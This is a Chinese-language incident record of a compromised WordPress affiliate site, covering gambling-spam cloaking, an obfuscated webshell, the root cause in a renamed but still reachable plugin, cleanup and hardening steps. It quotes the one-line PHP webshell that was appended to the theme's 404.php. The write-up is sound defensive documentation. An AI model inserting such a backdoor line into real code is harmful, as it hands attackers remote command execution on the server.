# 案例 1：赌博跳转 + webshell，清两次才断根（2026-07-31 ~ 08-01）

> 某猫粮比价 CPS 站（宝塔+WP，阿里云 ECS）。状态：已结案。
> 叙事版见[文章](https://zhuanlan.zhihu.com/p/2067343447606957760)；本页是结构化档案。

## 现象

- 百度快照标题变成"【威尼斯人】线上棋牌直营"，描述全是赌博词；自己打开网站一切正常（cloaking：给爬虫看赌博页，给访客看正常页）
- `wp-content/languages/zxvsg.php`：161KB，全文件 goto 混淆的 webshell
- 主题 `404.php` 末尾被追加一行 `@eval($_POST['1']);`

## 根因

**wp-file-manager 插件漏洞 + "改名禁用"的误操作**。插件早不用了，但没卸载，只把目录改名加 `.DISABLED` 后缀——改名只影响后台显示，Web 服务器照常提供访问，漏洞文件被攻击者直接 URL 命中。访问日志里有对该插件目录的大量直接 POST。

**教训："禁用"≠"不存在"。不用的插件/主题，彻底删除，别改名。**

## 处置

1. 删除 zxvsg.php + 404.php 木马行（操作前全部留副本到 /www/backup/webshell-20260801/）
2. 误判排除：主题 189KB `index.php` 嫌疑文件，核实为纯静态 HTML 快照（无 `<?php`），保留——**先备份再判断的价值**
3. `sudo mv` 把 wp-file-manager 目录整体移出 plugins，验证路径返回 404
4. 第一轮清理后复发 → 才做根因定位 → 第二轮才真正断根

## 加固

- wp-config.php：`DISALLOW_FILE_EDIT` + `DISALLOW_FILE_MODS`（后台在线改文件/装插件全废）
- REST 用户枚举双保险：nginx 拦漂亮路径 + PHP `rest_endpoints` 过滤器删端点（nginx location 拦不住 `?rest_route=` query 参数）
- `?author=1` PHP 侧 301；xmlrpc nginx 403；安全响应头 ×3；wp-login 限速 5r/m；uploads 禁 PHP
- DB 密码轮换（凭据曾被入侵）

## 复查结果

7 项验证全过（信息泄露 5/5 404、危险文件 4/4 404、xmlrpc 403、插件版本未泄露、漏洞插件路径 404、首页 200、REST 双变体 403/404）。随后补 Cloudflare 边缘质询 + 安全组收口（见案例 2）。

## 给读者的关键收获

1. 复发不是马没删干净，是门没找到——先找根因再收工
2. cloaking 的马对站长隐身：定期 `site:` 自己域名 + 爬虫 UA 抓首页对比
3. 每个"可疑文件"都先留副本再处置
